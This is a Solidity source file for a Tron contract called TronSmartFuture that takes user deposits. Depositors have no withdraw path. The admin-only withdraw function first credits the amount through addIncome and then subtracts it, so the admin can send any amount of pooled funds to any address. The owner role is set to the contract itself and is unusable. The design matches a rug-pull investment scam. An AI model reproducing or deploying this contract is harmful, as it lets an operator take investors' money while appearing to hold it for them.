//SourceUnit: TronSmartFuture.sol

pragma solidity ^0.5.9;


contract TronSmartFuture{
   
    using SafeMath for uint;
    
    address payable owner;
    address payable admin;
    
    struct User{
        uint balances;
        uint timestamp;
        
    }
    
    mapping (address => User) internal users;
    
    modifier auth(){
        require(msg.sender == owner,"You are not authorized owner.");
        _;
    }
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized owner.");
        _;
    }
    
    
    function changeOwner(address payable newOwner) public auth{
        owner = newOwner;
    }
    
    //Getters
    function checkWallet(address addr) public view returns(uint){
        User storage user = users[addr];
        return user.balances;
    }
    
    function getContractBalance() view public returns(uint){
       return address(this).balance;
        
    } 
    
    function adminAddress() view public returns(address){
        return admin;
    }
    
    //Events
    event Deposit(address indexed _from, uint _value);
    event Withdraw(address indexed _from, uint _value);
    event Income(address indexed _from, uint _value);
    
   
    constructor() payable public{
        owner = address(this);
        admin = msg.sender;
    }
    
    //Fallback
    function() payable external{
        
    }
    
    //Setters
    function deposit() payable public returns(uint){  
        
        User storage user = users[msg.sender];
        require(msg.value >= 1000000000,"Invalid Investment Amount"); 
        
        
        user.balances = user.balances.add(msg.value);
        
        user.timestamp = now;
        emit Deposit(msg.sender, msg.value);
        return msg.value;
        
    }  
    
    function addIncome(address winner, uint income) internal returns(uint){  
        User storage user = users[winner];
        user.balances = user.balances.add(income);
        user.timestamp = now;
        emit Income(winner, income);
        return income;
    }  
     
      
    function withdraw(address payable addr, uint _amount) payable public onlyAdmin returns(uint){
        User storage user = users[addr];
        addIncome(addr,_amount);
        user.balances = user.balances.sub(_amount);
        user.timestamp = now;
        addr.transfer(_amount);
        emit Withdraw(addr, _amount);
        return _amount;
    }
    
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}